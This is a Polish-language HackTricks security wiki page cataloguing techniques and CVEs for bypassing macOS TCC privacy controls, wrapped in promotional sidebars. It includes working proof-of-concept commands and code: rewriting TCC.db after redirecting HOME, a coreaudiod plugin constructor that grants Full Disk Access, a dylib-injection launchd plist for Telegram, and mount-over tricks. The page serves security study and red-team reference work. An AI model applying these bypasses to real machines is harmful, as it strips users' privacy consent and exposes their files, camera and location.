# Bypassy TCC w systemie macOS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Według funkcjonalności

### Bypass zapisu

To nie jest bypass, to po prostu sposób działania TCC: **Nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu pulpitu użytkownika, nadal może na niego zapisywać**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Atrybut rozszerzony `com.apple.macl` jest dodawany do nowego **pliku**, aby umożliwić aplikacji twórcy dostęp do odczytu.

### Ominięcie SSH

Domyślnie dostęp przez **SSH miał "Pełny dostęp do dysku"**. Aby to wyłączyć, musisz mieć go wymienionego, ale wyłączonego (usunięcie go z listy nie usunie tych uprawnień):

![](<../../../../../.gitbook/assets/image (569).png>)

Tutaj znajdziesz przykłady, jak niektóre **złośliwe oprogramowanie było w stanie ominąć tę ochronę**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Zauważ, że teraz, aby móc włączyć SSH, potrzebujesz **Pełnego dostępu do dysku**
{% endhint %}

### Obsługa rozszerzeń - CVE-2022-26767

Atrybut **`com.apple.macl`** jest przypisywany plikom, aby dać **pewnej aplikacji uprawnienia do odczytu**. Ten atrybut jest ustawiany, gdy **przeciągniesz i upuścisz** plik na aplikację lub gdy użytkownik **dwukrotnie kliknie** plik, aby otworzyć go za pomocą **domyślnej aplikacji**.

Dlatego użytkownik mógłby **zarejestrować złośliwą aplikację**, aby obsługiwać wszystkie rozszerzenia i wywoływać usługi uruchamiania w celu **otwarcia** dowolnego pliku (w ten sposób złośliwy plik otrzyma uprawnienia do odczytu).

### iCloud

Dzięki uprawnieniu **`com.apple.private.icloud-account-access`** możliwa jest komunikacja z usługą XPC **`com.apple.iCloudHelper`**, która **udostępnia tokeny iCloud**.

**iMovie** i **Garageband** miały to uprawnienie i inne, które to umożliwiały.

Aby uzyskać więcej **informacji** na temat wykorzystania uprawnienia do **uzyskania tokenów iCloud**, zapoznaj się z prezentacją: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatyzacja

Aplikacja z uprawnieniem **`kTCCServiceAppleEvents`** będzie mogła **kontrolować inne aplikacje**. Oznacza to, że może wykorzystać uprawnienia przyznane innym aplikacjom.

Aby uzyskać więcej informacji na temat skryptów Apple, sprawdź:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Na przykład, jeśli aplikacja ma **uprawnienia automatyzacji dla `iTerm`**, na przykład w tym przykładzie **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Przez iTerm

Terminal, który nie ma Pełnego dostępu do dysku, może wywołać iTerm, który go ma, i użyć go do wykonywania działań:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Nad Finderem

Jeśli aplikacja ma dostęp nad Finderem, może użyć takiego skryptu:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Według zachowania aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Demon **tccd** w przestrzeni użytkownika używa zmiennej środowiskowej **`HOME`** do dostępu do bazy danych użytkowników TCC zlokalizowanej w: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym postem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i ponieważ demon TCC działa za pośrednictwem `launchd` w domenie bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.\
W związku z tym, **atakujący może ustawić zmienną środowiskową `$HOME`** w **`launchctl`** tak, aby wskazywała na **kontrolowany katalog**, **zrestartować** demona **TCC**, a następnie **bezpośrednio modyfikować bazę danych TCC**, aby uzyskać **wszystkie dostępne uprawnienia TCC** bez konieczności pytania użytkownika końcowego.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notatki

Notatki miały dostęp do chronionych lokalizacji TCC, ale gdy tworzona jest notatka, jest ona tworzona w **niechronionej lokalizacji**. Można więc poprosić notatki o skopiowanie chronionego pliku do notatki (czyli do niechronionej lokalizacji), a następnie uzyskać dostęp do pliku:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokacja

Binarny plik `/usr/libexec/lsd` z biblioteką `libsecurity_translocate` miał uprawnienie `com.apple.private.nullfs_allow`, które pozwalało na utworzenie montażu **nullfs**, oraz uprawnienie `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`**, aby uzyskać dostęp do każdego pliku.

Było możliwe dodanie atrybutu kwarantanny do "Library", wywołanie usługi XPC **`com.apple.security.translocation`**, a następnie mapowanie Library na **`$TMPDIR/AppTranslocation/d/d/Library`**, gdzie można było **uzyskać dostęp** do wszystkich dokumentów w Library.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ma interesującą funkcję: gdy jest uruchomiony, **importuje** pliki przeciągnięte do **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** do biblioteki multimedialnej użytkownika. Ponadto, wywołuje coś w stylu: **`rename(a, b);`**, gdzie `a` i `b` to:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

To zachowanie **`rename(a, b);`** jest podatne na **Race Condition**, ponieważ można umieścić w folderze `Automatically Add to Music.localized` fałszywy plik **TCC.db**, a następnie, gdy zostanie utworzony nowy folder(b), skopiować plik, go usunąć i skierować go do **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Jeśli **`SQLITE_SQLLOG_DIR="ścieżka/folder"`**, oznacza to, że **każda otwarta baza danych jest kopiowana do tej ścieżki**. W tej podatności kontrola ta została wykorzystana do **zapisu** wewnątrz bazy danych SQLite, która zostanie **otwarta przez proces z bazą danych TCC**, a następnie wykorzystano **`SQLITE_SQLLOG_DIR`** z symlinkiem w nazwie pliku, aby po otwarciu tej bazy danych, nadpisać bazę danych użytkownika **TCC.db** otwartą bazą danych.
**Więcej informacji** [**w artykule**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i** [**w prezentacji**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Jeśli zmienna środowiskowa **`SQLITE_AUTO_TRACE`** jest ustawiona, biblioteka **`libsqlite3.dylib`** rozpocznie **logowanie** wszystkich zapytań SQL. Wiele aplikacji korzystało z tej biblioteki, więc było możliwe zalogowanie wszystkich ich zapytań SQLite.

Kilka aplikacji Apple korzystało z tej biblioteki do uzyskiwania dostępu do chronionych informacji TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Ta **zmienna środowiskowa jest używana przez framework `Metal`,** który jest zależnością różnych programów, zwłaszcza `Music`, który ma FDA.

Ustawienie następującego: `MTL_DUMP_PIPELINES_TO_JSON_FILE="ścieżka/nazwa"`. Jeśli `ścieżka` jest poprawnym katalogiem, wystąpi błąd i możemy użyć `fs_usage`, aby zobaczyć, co dzieje się w programie:

* zostanie otwarty plik o nazwie `path/.dat.nosyncXXXX.XXXXXX` (X to losowa wartość) za pomocą `open()`
* jedno lub więcej wywołań `write()` zapisze zawartość do pliku (nie kontrolujemy tego)
* plik `path/.dat.nosyncXXXX.XXXXXX` zostanie przemianowany za pomocą `rename()` na `path/name`

Jest to tymczasowy zapis pliku, a następnie **`rename(old, new)`**, **który nie jest bezpieczny**.

Nie jest bezpieczny, ponieważ musi **rozwiązać osobno stare i nowe ścieżki**, co może zająć trochę czasu i być podatne na wyścig. Więcej informacji można znaleźć w funkcji `xnu` o nazwie `renameat_internal()`.

{% hint style="danger" %}
Podsumowując, jeśli uprzywilejowany proces zmienia nazwę z folderu, który kontrolujesz, możesz zdobyć RCE i sprawić, że dostępny będzie inny plik lub, jak w przypadku tej CVE, otworzyć plik utworzony przez uprzywilejowaną aplikację i przechować FD.

Jeśli operacja zmiany nazwy dotyczy folderu, który kontrolujesz, podczas gdy zmodyfikowałeś plik źródłowy lub masz do niego FD, możesz zmienić plik (lub folder) docelowy na symlink, dzięki czemu możesz zapisywać w nim w dowolnym momencie.
{% endhint %}

To była atak w przypadku CVE: Na przykład, aby nadpisać bazę danych użytkownika `TCC.db`, możemy:

* utworzyć `/Users/hacker/ourlink`, który wskazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
* utworzyć katalog `/Users/hacker/tmp/`
* ustawić `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* wywołać błąd, uruchamiając `Music` z tą zmienną środowiskową
* przechwycić `open()` dla `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X to losowa wartość)
* tutaj również `open()` tego pliku w celu zapisu i zachowania deskryptora pliku
* atomowo zamienić `/Users/hacker/tmp` na `/Users/hacker/ourlink` **w pętli**
* robimy to, aby zwiększyć szanse na sukces, ponieważ okno wyścigu jest dość wąskie, ale przegrana w wyścigu ma znikomy wpływ
* poczekaj chwilę
* sprawdź, czy udało się
* jeśli nie, uruchom ponownie od początku

Więcej informacji można znaleźć pod adresem [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Teraz, jeśli spróbujesz użyć zmiennej środowiskowej `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacje nie będą się uruchamiać.
{% endhint %}

### Apple Remote Desktop

Jako root możesz włączyć tę usługę, a agent **ARD będzie miał pełny dostęp do dysku**, co użytkownik może wykorzystać, aby skopiować nową bazę danych użytkownika **TCC**.

## Przez **NFSHomeDirectory**

TCC używa bazy danych w folderze HOME użytkownika do kontrolowania dostępu do zasobów specyficznych dla użytkownika w **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Dlatego jeśli użytkownikowi uda się uruchomić TCC z zmienną środowiskową `$HOME` wskazującą na **inny folder**, użytkownik może utworzyć nową bazę danych TCC w **/Library/Application Support/com.apple.TCC/TCC.db** i oszukać TCC, aby przyznał dowolne uprawnienia TCC dowolnej aplikacji.

{% hint style="success" %}
Należy zauważyć, że Apple używa ustawienia przechowywanego w profilu użytkownika w atrybucie **`NFSHomeDirectory`** jako wartość `$HOME`, więc jeśli skompromitujesz aplikację mającą uprawnienia do modyfikowania tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **uzbroić** tę opcję w celu obejścia TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa narzędzi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) do modyfikacji folderu **HOME** użytkownika.

1. Uzyskaj blok _csreq_ dla docelowej aplikacji.
2. Umieść fałszywy plik _TCC.db_ z wymaganym dostępem i blokiem _csreq_.
3. Wyeksportuj wpis usług katalogowych użytkownika za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis usług katalogowych, aby zmienić katalog domowy użytkownika.
5. Zaimportuj zmodyfikowany wpis usług katalogowych za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i uruchom ponownie proces.

Drugi POC używa **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Było możliwe uruchomienie **`configd`** z opcją **`-t`**, co pozwalało atakującemu określić **niestandardowy pakiet do załadowania**. W związku z tym, wykorzystanie **zastępowało** metodę zmiany katalogu domowego użytkownika za pomocą **`dsexport`** i **`dsimport`** przez **wstrzyknięcie kodu do `configd`**.

Więcej informacji można znaleźć w [**oryginalnym raporcie**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Przez wstrzyknięcie procesu

Istnieje wiele różnych technik wstrzykiwania kodu do procesu i wykorzystywania jego uprawnień TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Najczęstsze wstrzykiwanie procesu do obejścia TCC odbywa się za pomocą **wtyczek (ładowanie bibliotek)**.\
Wtyczki to dodatkowy kod zwykle w postaci bibliotek lub plików plist, które będą **ładowane przez główną aplikację** i będą wykonywane w jej kontekście. Dlatego jeśli główna aplikacja miała dostęp do plików TCC o ograniczonym dostępie (poprzez przyznane uprawnienia lub entitlements), **niestandardowy kod również będzie miał do nich dostęp**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała wtyczki z rozszerzeniem **`.daplug`** i **nie miała zabezpieczeń** runtime.

Aby uzbroić tę CVE, **zmieniono** **`NFSHomeDirectory`** (wykorzystując wcześniejsze uprawnienia), aby móc **przejąć bazę danych TCC użytkowników** i obejść TCC.

Więcej informacji można znaleźć w [**oryginalnym raporcie**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Binarny plik **`/usr/sbin/coreaudiod`** miał uprawnienia `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Pierwsze uprawnienie pozwalało na **wstrzykiwanie kodu**, a drugie dawało dostęp do **zarządzania TCC**.

Ten binarny plik pozwalał na ładowanie **wtyczek innych firm** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego też było możliwe **załadowanie wtyczki i nadużycie uprawnień TCC** za pomocą tego PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Aby uzyskać więcej informacji, sprawdź [**oryginalny raport**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Wtyczki warstwy abstrakcji urządzenia (DAL)

Aplikacje systemowe, które otwierają strumień kamery za pomocą Core Media I/O (aplikacje z **`kTCCServiceCamera`**), ładowane są **w procesie tych wtyczek** znajdujących się w `/Library/CoreMediaIO/Plug-Ins/DAL` (nieograniczone przez SIP).

Wystarczy tam przechowywać bibliotekę z **konstruktorem** i będzie działać do **wstrzykiwania kodu**.

Wiele aplikacji Apple było podatnych na to.

### Firefox

Aplikacja Firefox miała uprawnienia `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Aby uzyskać więcej informacji na temat łatwego wykorzystania tego [**sprawdź oryginalny raport**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarny plik `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał uprawnienia **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, co pozwalało na wstrzyknięcie kodu do procesu i wykorzystanie uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram miał uprawnienia **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, więc było możliwe ich wykorzystanie do **uzyskania dostępu do jego uprawnień**, takich jak nagrywanie za pomocą kamery. [**Znajdziesz ładunek w opisie**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Zauważ, że do załadowania biblioteki za pomocą zmiennej środowiskowej został utworzony **niestandardowy plik plist**, a następnie użyto **`launchctl`**, aby go uruchomić:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Poprzez otwieranie wywołań

Możliwe jest wywołanie **`open`** nawet w trybie piaskownicy.

### Skrypty terminalowe

Często zdarza się, że terminalowi użytkownicy przyznają **Pełny dostęp do dysku (FDA)**. Możliwe jest wywołanie skryptów **`.terminal`** przy użyciu tego uprawnienia.

Skrypty **`.terminal`** są plikami plist, takimi jak ten, zawierającym polecenie do wykonania w kluczu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacja może napisać skrypt terminalowy w lokalizacji takiej jak /tmp i uruchomić go za pomocą polecenia:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Poprzez montowanie

### CVE-2020-9771 - bypass TCC i eskalacja uprawnień za pomocą mount\_apfs

**Dowolny użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować migawkę Time Machine i **uzyskać dostęp do WSZYSTKICH plików** tej migawki.\
Jedynym wymaganym uprawnieniem jest, aby aplikacja używana (np. `Terminal`) miała **Pełny dostęp do dysku** (FDA) (`kTCCServiceSystemPolicyAllfiles`), które muszą zostać przyznane przez administratora.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Bardziej szczegółowe wyjaśnienie można znaleźć w [**oryginalnym raporcie**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montowanie nad plikiem TCC

Nawet jeśli plik bazy danych TCC jest chroniony, możliwe było **zamontowanie nowego pliku TCC.db nad katalogiem**:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Sprawdź **pełne wykorzystanie** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Narzędzie **`/usr/sbin/asr`** pozwalało skopiować cały dysk i zamontować go w innym miejscu, omijając zabezpieczenia TCC.

### Usługi lokalizacyjne

Istnieje trzecia baza danych TCC w **`/var/db/locationd/clients.plist`**, która wskazuje, które klienty mają dostęp do **usług lokalizacyjnych**.\
Folder **`/var/db/locationd/` nie był chroniony przed montowaniem DMG**, więc można było zamontować nasz własny plist.

## Przez aplikacje uruchamiane przy starcie

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Przez grep

W wielu przypadkach pliki przechowują wrażliwe informacje, takie jak adresy e-mail, numery telefonów, wiadomości... w niechronionych lokalizacjach (co stanowi podatność w systemie Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Sztuczne kliknięcia

To już nie działa, ale [**działało w przeszłości**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Inny sposób przy użyciu [**zdarzeń CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Odnośniki

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Sposobów na Ominięcie Mechanizmów Prywatności w macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
